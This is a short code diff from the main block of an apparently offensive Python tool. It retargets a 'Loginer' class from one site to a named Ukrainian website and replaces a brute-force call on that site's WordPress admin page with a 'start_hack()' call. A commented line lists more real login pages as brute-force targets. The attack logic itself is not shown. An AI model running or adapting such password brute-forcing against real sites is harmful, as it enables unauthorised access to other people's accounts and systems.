@@ -185,8 +185,8 @@ if __name__ == "__main__":
             "page_limit": None,
             "vocabulary": False,
             }
-	c = Configer("https://inmac.org/login/", settings)
+	c = Configer("http://leafus.com.ua/", settings)
 	log = Loginer(c)
 	
 	# log.bruteforce_attack(['https://id.bigmir.net/', 'http://leafus.com.ua/wp-admin', 'https://www.ukr.net/'])
-	log.bruteforce_attack(['http://leafus.com.ua/wp-admin'])
+	log.start_hack()
